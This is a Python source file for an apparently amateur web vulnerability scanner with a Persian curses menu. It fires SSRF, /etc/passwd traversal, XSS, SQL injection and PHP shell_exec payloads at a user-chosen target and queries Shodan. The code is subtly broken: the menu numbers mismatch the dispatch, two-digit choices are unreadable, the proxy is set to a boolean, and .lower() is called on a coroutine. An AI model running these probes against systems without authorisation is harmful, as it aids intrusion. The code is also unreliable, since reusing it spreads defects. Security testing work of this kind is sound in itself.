import asyncio
import curses
import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import json
from datetime import datetime
from shodan import Shodan
import os

# ASCII LOGO BK
LOGO = """
 /$$$$$$$  /$$   /$$
| $$__  $$| $$  | $$
| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$
| $$____/ |_____  $$
| $$            | $$
| $$            | $$
|__/            |__/
"""

# ویژگی‌ها با شماره‌های مربوطه
FEATURES = {
    "1": "بررسی سرآیندهای امنیتی",
    "2": "بررسی IDOR",
    "3": "بررسی SSRF",
    "4": "بررسی Path Traversal",
    "5": "بررسی XSS",
    "6": "بررسی SQL Injection",
    "7": "بررسی RCE",
    "8": "اسکن با Shodan",
    "9": "پشتیبانی از پروکسی",
    "10": "اسکن دایرکتوری‌های مخفی",
    "11": "بررسی فایل‌های حساس (robots.txt و .git/)",
    "12": "خروج"
}

class AdvancedScanner:
    def __init__(self, target_url, shodan_api_key=None, proxy=None):
        self.target_url = target_url.rstrip("/")
        self.session = aiohttp.ClientSession()
        self.vulnerabilities = []
        self.shodan_api_key = shodan_api_key
        self.proxy = proxy

    async def check_security_headers(self):
        """بررسی سرآیندهای امنیتی"""
        try:
            async with self.session.get(self.target_url, proxy=self.proxy) as response:
                headers = response.headers
                missing_headers = []
                required_headers = [
                    "Content-Security-Policy",
                    "X-Frame-Options",
                    "X-Content-Type-Options",
                    "Strict-Transport-Security",
                    "Referrer-Policy",
                ]
                for header in required_headers:
                    if header not in headers:
                        missing_headers.append(header)
                if missing_headers:
                    return f"عدم وجود سرآیندهای امنیتی: {missing_headers}"
                return "سرآیندهای امنیتی کامل است."
        except Exception as e:
            return f"خطا در بررسی سرآیندها: {str(e)}"

    async def scan_idor(self):
        """بررسی IDOR"""
        params = self.extract_params(self.target_url)
        if params:
            return f"پارامترهای یافت‌شده برای تست IDOR: {params}"
        return "پارامتر قابل تست برای IDOR یافت نشد."

    async def scan_ssrf(self):
        """بررسی SSRF"""
        payload = "http://169.254.169.254/latest/meta-data/"
        try:
            async with self.session.get(urljoin(self.target_url, payload), proxy=self.proxy) as response:
                if response.status == 200:
                    return "آسیب‌پذیری SSRF یافت شد!"
            return "SSRF یافت نشد."
        except Exception as e:
            return f"خطا در بررسی SSRF: {str(e)}"

    async def scan_path_traversal(self):
        """بررسی Path Traversal"""
        test_url = f"{self.target_url}/../../etc/passwd"
        try:
            async with self.session.get(test_url, proxy=self.proxy) as response:
                if "root:" in await response.text():
                    return "آسیب‌پذیری Path Traversal یافت شد!"
            return "Path Traversal یافت نشد."
        except Exception as e:
            return f"خطا در بررسی Path Traversal: {str(e)}"

    async def scan_xss(self):
        """بررسی XSS"""
        payload = "<script>alert('XSS')</script>"
        try:
            async with self.session.get(f"{self.target_url}?search={payload}", proxy=self.proxy) as response:
                if payload in await response.text():
                    return "آسیب‌پذیری XSS یافت شد!"
            return "XSS یافت نشد."
        except Exception as e:
            return f"خطا در بررسی XSS: {str(e)}"

    async def scan_sql_injection(self):
        """بررسی SQL Injection"""
        payload = "' OR 1=1 --"
        try:
            async with self.session.get(f"{self.target_url}?id={payload}", proxy=self.proxy) as response:
                if "error" in await response.text().lower():
                    return "آسیب‌پذیری SQL Injection یافت شد!"
            return "SQL Injection یافت نشد."
        except Exception as e:
            return f"خطا در بررسی SQL Injection: {str(e)}"

    async def scan_rce(self):
        """بررسی RCE"""
        payload = "<?php echo shell_exec('id'); ?>"
        try:
            async with self.session.get(f"{self.target_url}/upload.php?file={payload}", proxy=self.proxy) as response:
                if "uid=" in await response.text():
                    return "آسیب‌پذیری RCE یافت شد!"
            return "RCE یافت نشد."
        except Exception as e:
            return f"خطا در بررسی RCE: {str(e)}"

    async def shodan_scan(self):
        """استفاده از Shodan برای بررسی اطلاعات سرور"""
        if not self.shodan_api_key:
            return "Shodan API Key موجود نیست."
        try:
            api = Shodan(self.shodan_api_key)
            target_ip = urlparse(self.target_url).netloc
            results = api.host(target_ip)
            return f"نتایج اسکن Shodan:\n{results}"
        except Exception as e:
            return f"خطا در Shodan Scan: {str(e)}"

    async def scan_hidden_directories(self):
        """اسکن دایرکتوری‌های مخفی"""
        wordlist = ["admin", "backup", "hidden", "test"]
        found = []
        for dir in wordlist:
            test_url = f"{self.target_url}/{dir}"
            try:
                async with self.session.get(test_url, proxy=self.proxy) as response:
                    if response.status == 200:
                        found.append(test_url)
            except Exception as e:
                return f"خطا در اسکن دایرکتوری‌های مخفی: {str(e)}"
        return f"دایرکتوری‌های مخفی یافت‌شده: {found}" if found else "هیچ دایرکتوری مخفی یافت نشد."

    async def scan_sensitive_files(self):
        """بررسی فایل‌های حساس"""
        files = ["/robots.txt", "/.git/"]
        found = []
        for file in files:
            test_url = f"{self.target_url}{file}"
            try:
                async with self.session.get(test_url, proxy=self.proxy) as response:
                    if response.status == 200:
                        found.append(test_url)
            except Exception as e:
                return f"خطا در بررسی فایل‌های حساس: {str(e)}"
        return f"فایل‌های حساس یافت‌شده: {found}" if found else "هیچ فایل حساس یافت نشد."

    def extract_params(self, url):
        """استخراج پارامترهای ورودی URL"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        return list(query.keys())

async def user_interface(stdscr):
    """رابط کاربری کنسولی"""
    curses.curs_set(0)
    stdscr.clear()
    stdscr.refresh()

    stdscr.addstr(1, 5, LOGO, curses.A_BOLD)
    stdscr.addstr(10, 5, "ابزارهای تست نفوذ:", curses.A_UNDERLINE)

    # نمایش لیست ویژگی‌ها
    row = 12
    for key, feature in FEATURES.items():
        stdscr.addstr(row, 7, f"[{key}] {feature}")
        row += 1

    stdscr.addstr(row + 2, 5, "لطفاً شماره ابزار مورد نظر را انتخاب کنید:")
    stdscr.refresh()

    while True:
        key = stdscr.getch()
        key = chr(key)

        if key in FEATURES:
            return key

def main():
    target_url = input("آدرس هدف را وارد کنید: ")
    shodan_key = os.getenv("SHODAN_API_KEY")
    proxy = input("آیا از پروکسی استفاده می‌کنید؟ (بله/خیر): ").lower() == "بله"
    scanner = AdvancedScanner(target_url, shodan_api_key=shodan_key, proxy=proxy)

    while True:
        choice = curses.wrapper(user_interface)
        
        if choice == "1":
            result = asyncio.run(scanner.check_security_headers())
        elif choice == "2":
            result = asyncio.run(scanner.scan_idor())
        elif choice == "3":
            result = asyncio.run(scanner.scan_ssrf())
        elif choice == "4":
            result = asyncio.run(scanner.scan_path_traversal())
        elif choice == "5":
            result = asyncio.run(scanner.scan_xss())
        elif choice == "6":
            result = asyncio.run(scanner.scan_sql_injection())
        elif choice == "7":
            result = asyncio.run(scanner.scan_rce())
        elif choice == "8":
            result = asyncio.run(scanner.shodan_scan())
        elif choice == "9":
            result = asyncio.run(scanner.scan_hidden_directories())
        elif choice == "10":
            result = asyncio.run(scanner.scan_sensitive_files())
        elif choice == "11":
            print("خروج از برنامه.")
            break
        else:
            result = "گزینه نامعتبر!"

        print(f"\n[نتیجه]: {result}\n")

if __name__ == "__main__":
    main()
